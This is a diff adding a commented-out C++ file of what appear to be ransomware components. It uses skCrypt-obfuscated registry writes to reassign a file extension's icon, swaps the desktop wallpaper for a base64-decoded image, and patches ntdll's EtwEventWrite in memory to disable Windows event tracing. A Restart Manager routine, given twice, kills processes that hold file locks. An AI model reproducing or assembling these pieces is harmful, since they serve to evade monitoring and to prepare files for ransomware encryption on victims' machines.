@@ -1,0 +1,189 @@
+/*std::vector<std::vector<std::wstring>> SplitVector(const std::vector<std::wstring> &input, size_t parts)
+{
+	std::vector<std::vector<std::wstring>> output(parts);
+	size_t avgSize = input.size() / parts;
+	size_t extra = input.size() % parts;
+	size_t currentIdx = 0;
+
+	for (size_t i = 0; i < parts; ++i)
+	{
+		size_t partSize = avgSize + (i < extra ? 1 : 0);
+		output[i].reserve(partSize);
+		for (size_t j = 0; j < partSize; ++j)
+		{
+			output[i].push_back(input[currentIdx++]);
+		}
+	}
+
+	return output;
+}
+
+void ChangeIcon() {
+	string progId = "";
+	for (int i = 1; i < (FILE_EXTENSION).length(); i++)
+		progId += towlower((FILE_EXTENSION)[i]);
+	progId += skCrypt("file");
+
+	CreateAndSetRegKey(HKEY_CURRENT_USER,
+		(string)skCrypt("Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\FileExts\\") + FILE_EXTENSION + (string)skCrypt("\\UserChoice"),
+		(string)skCrypt("ProgId"), progId);
+	CreateAndSetRegKey(HKEY_CLASSES_ROOT, FILE_EXTENSION, (string)skCrypt("NULL"), progId);
+	CreateAndSetRegKey(HKEY_CLASSES_ROOT, progId + (string)skCrypt("\\DefaultIcon"), (string)skCrypt("NULL"), FILESICON);
+
+	Exec(((string)skCrypt("assoc ") + FILE_EXTENSION + (string)skCrypt("=") + progId).c_str());
+}
+
+void ChangeWallpaper(const string& content) {
+	ofstream fout(NEWWALLPAPER, ios::binary | ios::out);
+	vector<BYTE> write = base64_decode(content);
+	fout.write((const char*)&write[0], write.size());
+	fout.close();
+	if (!Copyfile(((string)skCrypt("C:\\Users\\") + GetUsername() + (string)skCrypt("\\AppData\\Roaming\\Microsoft\\Windows\\Themes\\CachedFiles\\") + Split(Exec(skCrypt("dir /b %AppData%\\Microsoft\\Windows\\Themes\\CachedFiles")), '\n')[0]).c_str(), (OLDWALLPAPER).c_str()) && DEBUG)
+		cout << skCrypt("Wallpaper not copied!\n\n");
+
+	USES_CONVERSION_EX;
+	SystemParametersInfo(SPI_SETDESKWALLPAPER, 0, A2W_EX((NEWWALLPAPER).c_str(), (NEWWALLPAPER).length()), SPIF_UPDATEINIFILE);
+}
+
+void disableETW(void) {
+	// return 0
+	unsigned char patch[] = { 0x48, 0x33, 0xc0, 0xc3};     // xor rax, rax; ret
+	
+	ULONG oldprotect = 0;
+	size_t size = sizeof(patch);
+	
+	HANDLE hCurrentProc = GetCurrentProcess();
+	
+	unsigned char sEtwEventWrite[] = { 'E','t','w','E','v','e','n','t','W','r','i','t','e', 0x0 };
+	
+	void *pEventWrite = GetProcAddress(GetModuleHandle((LPCSTR) sNtdll), (LPCSTR) sEtwEventWrite);
+	
+	NtProtectVirtualMemory(hCurrentProc, &pEventWrite, (PSIZE_T) &size, PAGE_READWRITE, &oldprotect);
+	
+	memcpy(pEventWrite, patch, size / sizeof(patch[0]));
+	
+	NtProtectVirtualMemory(hCurrentProc, &pEventWrite, (PSIZE_T) &size, oldprotect, &oldprotect);
+	FlushInstructionCache(hCurrentProc, pEventWrite, size);
+	
+}
+
+bool FreeFileBusyResources(const wchar_t* PathName)
+{
+	bool result = false;
+
+	static HMODULE hlib = LoadLibraryW(L"Rstrtmgr.dll");
+
+	if (!hlib)
+		return result;
+
+	static tRmStartSession rmStartSession = (tRmStartSession)GetProcAddress(hlib, "RmStartSession");
+	static tRmRegisterResources rmRegisterResources = (tRmRegisterResources)GetProcAddress(hlib, "RmRegisterResources");
+	static tRmGetList rmGetList = (tRmGetList)GetProcAddress(hlib, "RmGetList");
+	static tRmEndSession rmEndSession = (tRmEndSession)GetProcAddress(hlib, "RmEndSession");
+	static tRmShutdown rmShutdown = (tRmShutdown)GetProcAddress(hlib, "RmShutdown");
+
+	if (!rmStartSession || !rmRegisterResources || !rmGetList || !rmEndSession || !rmShutdown)
+		return result;
+
+
+	DWORD dwSession = 0x0;
+	wchar_t szSessionKey[CCH_RM_SESSION_KEY + 1] = { 0 };
+	if (rmStartSession(&dwSession, 0x0, szSessionKey) == ERROR_SUCCESS)
+	{
+		DWORD err = 0;
+		if ((err = rmRegisterResources(dwSession, 1, &PathName, 0, NULL, 0, NULL)) == ERROR_SUCCESS)
+		{
+			DWORD dwReason = 0x0;
+			UINT nProcInfoNeeded = 0;
+			UINT nProcInfo = 0;
+			if (rmGetList(dwSession, &nProcInfoNeeded, &nProcInfo, NULL, &dwReason) == ERROR_MORE_DATA && nProcInfoNeeded) {
+				// file lock check it
+				result = (rmShutdown(dwSession, 1, 0) == ERROR_SUCCESS);
+			}
+		}
+		else {
+			dbg(LEVEL1, "ERROR: To check file lock %u", err);
+		}
+		rmEndSession(dwSession);
+	}
+
+	return result;
+}
+
+#include <windows.h>
+#include <stdio.h>
+
+typedef DWORD (WINAPI *tRmStartSession)(
+  DWORD *pSessionHandle,
+  DWORD dwSessionFlags,
+  WCHAR *strSessionKey
+);
+
+typedef DWORD (WINAPI *tRmRegisterResources)(
+  DWORD dwSessionHandle,
+  UINT nFiles,
+  LPCWSTR *rgsFileNames,
+  UINT nApplications,
+  RM_UNIQUE_PROCESS *rgApplications,
+  UINT nServices,
+  LPCWSTR *rgsServiceNames
+);
+
+typedef DWORD (WINAPI *tRmGetList)(
+  DWORD dwSessionHandle,
+  UINT *pnProcInfoNeeded,
+  UINT *pnProcInfo,
+  RM_PROCESS_INFO *rgAffectedApps,
+  LPDWORD lpdwRebootReasons
+);
+
+typedef DWORD (WINAPI *tRmEndSession)(
+  DWORD dwSessionHandle
+);
+
+typedef DWORD (WINAPI *tRmShutdown)(
+  DWORD dwSessionHandle,
+  UINT lActionFlags,
+  RM_WRITE_STATUS_CALLBACK fnStatus
+);
+
+bool FreeFileBusyResources(const wchar_t* PathName) {
+    bool result = false;
+
+    static HMODULE hlib = LoadLibraryW(L"Rstrtmgr.dll");
+
+    if (!hlib)
+        return result;
+
+    static tRmStartSession rmStartSession = (tRmStartSession)GetProcAddress(hlib, "RmStartSession");
+    static tRmRegisterResources rmRegisterResources = (tRmRegisterResources)GetProcAddress(hlib, "RmRegisterResources");
+    static tRmGetList rmGetList = (tRmGetList)GetProcAddress(hlib, "RmGetList");
+    static tRmEndSession rmEndSession = (tRmEndSession)GetProcAddress(hlib, "RmEndSession");
+    static tRmShutdown rmShutdown = (tRmShutdown)GetProcAddress(hlib, "RmShutdown");
+
+    if (!rmStartSession || !rmRegisterResources || !rmGetList || !rmEndSession || !rmShutdown)
+        return result;
+
+    DWORD dwSession = 0x0;
+    wchar_t szSessionKey[CCH_RM_SESSION_KEY + 1] = { 0 };
+    if (rmStartSession(&dwSession, 0x0, szSessionKey) == ERROR_SUCCESS) {
+        DWORD err = 0;
+        if ((err = rmRegisterResources(dwSession, 1, &PathName, 0, NULL, 0, NULL)) == ERROR_SUCCESS) {
+            DWORD dwReason = 0x0;
+            UINT nProcInfoNeeded = 0;
+            UINT nProcInfo = 0;
+            if (rmGetList(dwSession, &nProcInfoNeeded, &nProcInfo, NULL, &dwReason) == ERROR_MORE_DATA && nProcInfoNeeded) {
+                // file lock check it
+                result = (rmShutdown(dwSession, 1, 0) == ERROR_SUCCESS);
+            }
+        } else {
+            // Log error
+            result = false;
+        }
+        rmEndSession(dwSession);
+    }
+
+    return result;
+}
+
+*/
